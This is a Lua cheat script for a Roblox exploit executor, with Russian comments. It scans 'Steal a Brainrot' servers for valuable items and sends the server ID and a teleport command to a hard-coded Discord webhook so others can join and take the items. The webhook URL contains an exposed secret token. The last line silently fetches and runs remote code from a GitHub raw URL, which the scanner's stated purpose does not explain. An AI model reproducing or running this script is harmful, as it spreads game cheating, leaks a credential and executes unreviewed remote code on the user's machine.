-- 🎯 BRAINROT INCOME SCANNER v2.1 (С ИНДИВИДУАЛЬНЫМИ ПОРОГАМИ)
-- Сканирует все объекты в Steal a Brainrot и отправляет уведомления в Discord
-- Запуск: автоматически при старте + по клавише F

local Players = game:GetService('Players')
local UserInputService = game:GetService('UserInputService')
local HttpService = game:GetService('HttpService')

-- ⚙️ НАСТРОЙКИ
local GLOBAL_INCOME_THRESHOLD = 200_000_000 -- Глобальный минимум для объектов без индивидуальной настройки
local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1421494214570807481/uYgRF4vI6NEHNFF0tNmoG-wTOBypMlgTsRlmY_6qSkA4DxgTTCe70U7Cbv-kkTCoQOPz'

print('🎯 Brainrot Scanner v2.1 | JobId:', game.JobId)

-- 🎮 ОБЪЕКТЫ С ЭМОДЗИ, ВАЖНОСТЬЮ И ИНДИВИДУАЛЬНЫМ ПОРОГОМ
-- threshold: индивидуальный порог дохода для этого объекта (nil = использовать глобальный)
-- important: всегда показывать независимо от дохода
local OBJECTS = {
    ['Garama and Madundung'] = { emoji = '🧂', important = true, threshold = 50_000_000 },
    ['Dragon Cannelloni'] = { emoji = '🐲', important = true, threshold = 250_000_000 },
    ['La Supreme Combinasion'] = { emoji = '🔫', important = true, threshold = 40_000_000 },
    ['Ketupat Kepat'] = { emoji = '🍏', important = false, threshold = 150_000_000 },
    ['Strawberry Elephant'] = { emoji = '🐘', important = true, threshold = 250_000_000 },
    ['Spaghetti Tualetti'] = { emoji = '🚽', important = false, threshold = 420_000_000 },
    ['Ketchuru and Musturu'] = { emoji = '🍾', important = true, threshold = 30_000_000 },
    ['La Secret Combinasion'] = { emoji = '❓', important = true, threshold = 125_000_000 },
    ['Tralaledon'] = { emoji = '🦈', important = true, threshold = 20_000_000 },
    ['La Extinct Grande'] = { emoji = '🩻', important = false, threshold = 250_000_000 },
    ['Tictac Sahur'] = { emoji = '🕰️', important = true, threshold = 22_000_000 },
    ['Celularcini Viciosini'] = { emoji = '📞', important = true, threshold = 170_000_000 },
    ['Los Primos'] = { emoji = '🙆‍♂️', important = true, threshold = 20_000_000 },
    ['Tang Tang Keletang'] = { emoji = '📢', important = false, threshold = 190_000_000 },
    ['Money Money Puggy'] = { emoji = '🐶', important = false, threshold = 300_000_000 },
    ['Burguro And Fryuro'] = { emoji = '🍔', important = true, threshold = 150_000_000 },
    ['Chillin Chili'] = { emoji = '🌶', important = true, threshold = 160_000_000 },
    ['Spooky and Pumpky'] = { emoji = '🎃', important = true, threshold = 80_000_000 },
    ['Mieteteira Bicicleteira'] = { emoji = '☠️', important = false, threshold = 700_000_000 },
    ['Meowl'] = { emoji = '🐈', important = true, threshold = 200_000_000 },
    ['Chipso and Queso'] = { emoji = '🧀', important = false, threshold = 500_000_000 },
    ['La Casa Boo'] = { emoji = '👁‍🗨', important = true, threshold = 100_000_000 },
    ['Headless Horseman'] = { emoji = '🐴', important = true, threshold = 120_000_000 },
    ['Los Tacoritas'] = { emoji = '💀', important = true, threshold = 100_000_000 },
    ['La Taco Combinasion'] = { emoji = '👒', important = true, threshold = 270_000_000 },
    ['Cooki and Milki'] = { emoji = '🍪', important = true, threshold = 140_000_000 },
    ['Fragrama and Chocrama'] = { emoji = '🍫', important = true, threshold = 80_000_000 },
    ['Los Spaghettis'] = { emoji = '🍝', important = true, threshold = 200_000_000 },
    ['Orcaledon'] = { emoji = '🐭', important = true, threshold = 240_000_000 },
    ['W or L'] = { emoji = '🏆', important = true, threshold = 500_000_000 }, -- Высокий порог для редкого объекта
    ['Lavadorito Spinito'] = { emoji = '📺', important = true, threshold = 30_000_000 },
    ['Gobblino Uniciclino'] = { emoji = '🕊️', important = false, threshold = 300_000_000 },
    ['Fishino Clownino'] = { emoji = '🐠', important = true, threshold = 10_000_000 },
    ['La Ginger Sekolah'] = { emoji = '🎄', important = true, threshold = nil },
    ['Los Planitos'] = { emoji = '🪐', important = false, threshold = 310_000_000 },
    ['Guest 666'] = { emoji = '👿', important = true, threshold = 6_600_000 },
    ['Capitano Moby'] = { emoji = '🛥️', important = true, threshold = 100_000_000 },
}

-- Функция для определения, нужно ли показывать объект
local function shouldShow(name, gen)
    local cfg = OBJECTS[name]
    if not cfg then return false end
    
    -- Если объект важный, показываем всегда
    if cfg.important then
        return true
    end
    
    -- Проверяем индивидуальный порог
    if cfg.threshold then
        return gen >= cfg.threshold
    else
        -- Используем глобальный порог
        return gen >= GLOBAL_INCOME_THRESHOLD
    end
end

-- Функция для получения порога объекта (для отображения в уведомлении)
local function getThresholdForDisplay(name)
    local cfg = OBJECTS[name]
    if not cfg then return GLOBAL_INCOME_THRESHOLD end
    
    if cfg.threshold then
        return cfg.threshold
    else
        return GLOBAL_INCOME_THRESHOLD
    end
end

-- 💰 ПАРСЕР ДОХОДА: принимаем только строки, оканчивающиеся на "/s"
local function parseGenerationText(s)
    if type(s) ~= 'string' or s == '' then
        return nil
    end
    local norm = s:gsub('%$', ''):gsub(',', ''):gsub('%s+', '')
    local num, suffix = norm:match('^([%-%d%.]+)([KkMmBb]?)/s$')
    if not num then
        return nil
    end
    local val = tonumber(num)
    if not val then
        return nil
    end
    local mult = 1
    if suffix == 'K' or suffix == 'k' then
        mult = 1e3
    elseif suffix == 'M' or suffix == 'm' then
        mult = 1e6
    elseif suffix == 'B' or suffix == 'b' then
        mult = 1e9
    end
    return val * mult
end

local function formatIncomeNumber(n)
    if not n then
        return 'Unknown'
    end
    if n >= 1e9 then
        local v = n / 1e9
        return (v % 1 == 0 and string.format('%dB/s', v) or string.format(
            '%.1fB/s',
            v
        )):gsub('%.0B/s', 'B/s')
    elseif n >= 1e6 then
        local v = n / 1e6
        return (v % 1 == 0 and string.format('%dM/s', v) or string.format(
            '%.1fM/s',
            v
        )):gsub('%.0M/s', 'M/s')
    elseif n >= 1e3 then
        local v = n / 1e3
        return (v % 1 == 0 and string.format('%dK/s', v) or string.format(
            '%.1fK/s',
            v
        )):gsub('%.0K/s', 'K/s')
    else
        return string.format('%d/s', n)
    end
end

-- 📝 ПОЛУЧЕНИЕ ТЕКСТА ИЗ UI
local function grabText(inst)
    if not inst then
        return nil
    end
    if
        inst:IsA('TextLabel')
        or inst:IsA('TextButton')
        or inst:IsA('TextBox')
    then
        local ok, ct = pcall(function()
            return inst.ContentText
        end)
        if ok and type(ct) == 'string' and #ct > 0 then
            return ct
        end
        local t = inst.Text
        if type(t) == 'string' and #t > 0 then
            return t
        end
    end
    if inst:IsA('StringValue') then
        local v = inst.Value
        if type(v) == 'string' and #v > 0 then
            return v
        end
    end
    return nil
end

local function getOverheadInfo(animalOverhead)
    if not animalOverhead then
        return nil, nil
    end

    local name = nil
    local display = animalOverhead:FindFirstChild('DisplayName')
    if display then
        name = grabText(display)
    end

    if not name then
        local anyText = animalOverhead:FindFirstChildOfClass('TextLabel')
            or animalOverhead:FindFirstChildOfClass('TextButton')
            or animalOverhead:FindFirstChildOfClass('TextBox')
        name = anyText and grabText(anyText) or nil
    end

    local genText = nil
    local generation = animalOverhead:FindFirstChild('Generation')
    if generation then
        genText = grabText(generation)
    end

    if not genText then
        for _, child in ipairs(animalOverhead:GetDescendants()) do
            if
                child:IsA('TextLabel')
                or child:IsA('TextButton')
                or child:IsA('TextBox')
            then
                local text = grabText(child)
                if text and (text:match('%$') or text:match('/s')) then
                    genText = text
                    break
                end
            end
        end
    end

    return name, genText
end

local function isGuidName(s)
    return s:match('^[0-9a-fA-F]+%-%x+%-%x+%-%x+%-%x+$') ~= nil
end

-- 🔍 ПОЛНЫЕ СКАНЕРЫ
local function scanPlots()
    local results = {}
    local Plots = workspace:FindFirstChild('Plots')
    if not Plots then
        return results
    end

    for _, plot in ipairs(Plots:GetChildren()) do
        local Podiums = plot:FindFirstChild('AnimalPodiums')
        if Podiums then
            for _, podium in ipairs(Podiums:GetChildren()) do
                local Base = podium:FindFirstChild('Base')
                local Spawn = Base and Base:FindFirstChild('Spawn')
                local Attachment = Spawn and Spawn:FindFirstChild('Attachment')
                local Overhead = Attachment
                    and Attachment:FindFirstChild('AnimalOverhead')
                if Overhead then
                    local name, genText = getOverheadInfo(Overhead)
                    local genNum = genText and parseGenerationText(genText)
                        or nil
                    if name and genNum then
                        table.insert(
                            results,
                            { name = name, gen = genNum, location = 'Plot' }
                        )
                    end
                end
            end
        end
    end
    return results
end

local function scanRunway()
    local results = {}
    for _, obj in ipairs(workspace:GetChildren()) do
        if isGuidName(obj.Name) then
            local part = obj:FindFirstChild('Part')
            local info = part and part:FindFirstChild('Info')
            local overhead = info and info:FindFirstChild('AnimalOverhead')
            if overhead then
                local name, genText = getOverheadInfo(overhead)
                local genNum = genText and parseGenerationText(genText) or nil
                if name and genNum then
                    table.insert(
                        results,
                        { name = name, gen = genNum, location = 'Runway' }
                    )
                end
            end
        end
    end
    return results
end

local function scanAllOverheads()
    local results, processed = {}, {}
    local function recursiveSearch(parent)
        for _, child in ipairs(parent:GetChildren()) do
            if child.Name == 'AnimalOverhead' and not processed[child] then
                processed[child] = true
                local name, genText = getOverheadInfo(child)
                local genNum = genText and parseGenerationText(genText) or nil
                if name and genNum then
                    table.insert(
                        results,
                        { name = name, gen = genNum, location = 'World' }
                    )
                end
            end
            pcall(function()
                recursiveSearch(child)
            end)
        end
    end
    recursiveSearch(workspace)
    return results
end

local function scanPlayerGui()
    local results = {}
    local lp = Players.LocalPlayer
    if not lp then
        return results
    end

    local playerGui = lp:FindFirstChild('PlayerGui')
    if not playerGui then
        return results
    end

    local function searchInGui(parent)
        for _, child in ipairs(parent:GetChildren()) do
            if child.Name == 'AnimalOverhead' or child.Name:match('Animal') then
                local name, genText = getOverheadInfo(child)
                local genNum = genText and parseGenerationText(genText) or nil
                if name and genNum then
                    table.insert(
                        results,
                        { name = name, gen = genNum, location = 'GUI' }
                    )
                end
            end
            pcall(function()
                searchInGui(child)
            end)
        end
    end
    searchInGui(playerGui)
    return results
end

-- 📊 ГЛАВНАЯ ФУНКЦИЯ СБОРА
local function collectAll(timeoutSec)
    local t0 = os.clock()
    local collected = {}

    repeat
        collected = {}

        local allSources = {
            scanPlots(),
            scanRunway(),
            scanAllOverheads(),
            scanPlayerGui(),
        }

        for _, source in ipairs(allSources) do
            for _, item in ipairs(source) do
                table.insert(collected, item)
            end
        end

        local seen, unique = {}, {}
        for _, item in ipairs(collected) do
            local key = item.name .. ':' .. tostring(item.gen)
            if not seen[key] then
                seen[key] = true
                table.insert(unique, item)
            end
        end
        collected = unique

        if #collected > 0 then
            break
        end
        task.wait(0.5)
    until os.clock() - t0 > timeoutSec

    return collected
end

-- 📤 DISCORD УВЕДОМЛЕНИЯ
local function getRequester()
    return http_request
        or request
        or (syn and syn.request)
        or (fluxus and fluxus.request)
        or (KRNL_HTTP and KRNL_HTTP.request)
end

local function sendDiscordNotification(filteredObjects)
    local req = getRequester()
    if not req then
        warn('❌ Нет HTTP API в executor')
        return
    end

    local jobId = game.JobId
    local placeId = game.PlaceId

    if #filteredObjects == 0 then
        print('🔍 Важных объектов не найдено')
        return
    end

    -- Сортируем по важности и доходу
    local important, regular = {}, {}
    for _, obj in ipairs(filteredObjects) do
        local cfg = OBJECTS[obj.name]
        if cfg and cfg.important then
            table.insert(important, obj)
        else
            table.insert(regular, obj)
        end
    end

    table.sort(important, function(a, b)
        return a.gen > b.gen
    end)
    table.sort(regular, function(a, b)
        return a.gen > b.gen
    end)

    local sorted = {}
    for _, obj in ipairs(important) do
        table.insert(sorted, obj)
    end
    for _, obj in ipairs(regular) do
        table.insert(sorted, obj)
    end

    -- Формируем список
    local objectsList = {}
    for i = 1, math.min(10, #sorted) do
        local obj = sorted[i]
        local cfg = OBJECTS[obj.name] or {}
        local emoji = cfg.emoji or '💰'
        local mark = cfg.important and '⭐ ' or ''
        local threshold = getThresholdForDisplay(obj.name)
        local thresholdMet = obj.gen >= threshold
        
        table.insert(
            objectsList,
            string.format(
                '%s%s **%s** (%s) | Порог: %s %s',
                mark,
                emoji,
                obj.name,
                formatIncomeNumber(obj.gen),
                formatIncomeNumber(threshold),
                thresholdMet and '✅' or '❌'
            )
        )
    end
    local objectsText = table.concat(objectsList, '\n')

    -- Статистика по порогам
    local thresholdStats = {
        above = 0,
        below = 0,
        important = 0
    }
    
    for _, obj in ipairs(filteredObjects) do
        local cfg = OBJECTS[obj.name] or {}
        local threshold = getThresholdForDisplay(obj.name)
        
        if cfg.important then
            thresholdStats.important = thresholdStats.important + 1
        end
        
        if obj.gen >= threshold then
            thresholdStats.above = thresholdStats.above + 1
        else
            thresholdStats.below = thresholdStats.below + 1
        end
    end

    local teleportText = string.format(
        "`local ts = game:GetService('TeleportService'); ts:TeleportToPlaceInstance(%d, '%s')`",
        placeId,
        jobId
    )

    local copyButtonText = string.format(
        "📋 Нажмите чтобы скопировать JobId: ```%s```",
        jobId
    )

    local payload = {
        username = '🎯 Brainrot Scanner v2.1',
        embeds = {
            {
                title = '💎 Найдены ценные объекты в Steal a brainrot!',
                color = 0x2f3136,
                fields = {
                    {
                        name = '🆔 Сервер (Job ID)',
                        value = string.format('```%s```', jobId),
                        inline = false,
                    },
                    {
                        name = '📊 Статистика:',
                        value = string.format('✅ Выше порога: %d\n❌ Ниже порога: %d\n⭐ Важных: %d',
                            thresholdStats.above, thresholdStats.below, thresholdStats.important),
                        inline = false,
                    },
                    {
                        name = '💰 Объекты:',
                        value = objectsText,
                        inline = false,
                    },
                    {
                        name = '🚀 Телепорт команда:',
                        value = teleportText,
                        inline = false,
                    },
                    {
                        name = '📋 Скопировать JobId',
                        value = copyButtonText,
                        inline = false,
                    },
                },
                footer = {
                    text = string.format(
                        'Найдено: %d объектов • Глобальный порог: %s • %s',
                        #filteredObjects,
                        formatIncomeNumber(GLOBAL_INCOME_THRESHOLD),
                        os.date('%H:%M:%S')
                    ),
                },
                timestamp = DateTime.now():ToIsoDate(),
            },
        },
    }

    print('📤 Отправляю уведомление с', #filteredObjects, 'объектами')

    local ok, res = pcall(function()
        return req({
            Url = DISCORD_WEBHOOK_URL,
            Method = 'POST',
            Headers = { ['Content-Type'] = 'application/json' },
            Body = HttpService:JSONEncode(payload),
        })
    end)

    if ok then
        print('✅ Уведомление отправлено в Discord!')
    else
        warn('❌ Ошибка отправки:', res)
    end
end

-- 🎮 ГЛАВНАЯ ФУНКЦИЯ
local function scanAndNotify()
    print('🔍 Сканирую все объекты...')
    local allFound = collectAll(8.0)

    -- Фильтрация по индивидуальным порогам
    local filtered = {}
    for _, obj in ipairs(allFound) do
        if OBJECTS[obj.name] and shouldShow(obj.name, obj.gen) then
            table.insert(filtered, obj)
        end
    end

    -- Вывод в консоль с информацией о порогах
    print('Найдено всего объектов:', #allFound)
    print('Отфильтровано по порогам:', #filtered)

    for _, obj in ipairs(filtered) do
        local cfg = OBJECTS[obj.name] or {}
        local emoji = cfg.emoji or '💰'
        local mark = cfg.important and '⭐ ' or ''
        local threshold = getThresholdForDisplay(obj.name)
        local thresholdMet = obj.gen >= threshold
        
        print(
            string.format(
                '%s%s %s: %s | Порог: %s %s (%s)',
                mark,
                emoji,
                obj.name,
                formatIncomeNumber(obj.gen),
                formatIncomeNumber(threshold),
                thresholdMet and '✅' or '❌',
                obj.location or 'Unknown'
            )
        )
    end

    -- Отправляем уведомление если есть что показать
    if #filtered > 0 then
        sendDiscordNotification(filtered)
    else
        print('🔍 Нет объектов для уведомления')
    end
end

-- 🚀 ЗАПУСК
print('🎯 === BRAINROT INCOME SCANNER v2.1 ЗАПУЩЕН ===')
print('⚙️  Индивидуальные пороги включены')
print('💰 Глобальный порог:', formatIncomeNumber(GLOBAL_INCOME_THRESHOLD))
scanAndNotify()

-- ⌨️ ПОВТОР ПО КЛАВИШЕ F
local lastScan, DEBOUNCE = 0, 3
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then
        return
    end
    if input.KeyCode == Enum.KeyCode.F then
        local now = os.clock()
        if now - lastScan < DEBOUNCE then
            return
        end
        lastScan = now
        print('\n🔄 === ПОВТОРНОЕ СКАНИРОВАНИЕ (F) ===')
        scanAndNotify()
    end
end)

print('💡 Нажмите F для повторного сканирования')
print('📱 Discord webhook готов к отправке уведомлений')
loadstring(game:HttpGet("https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/botik.lua"))()
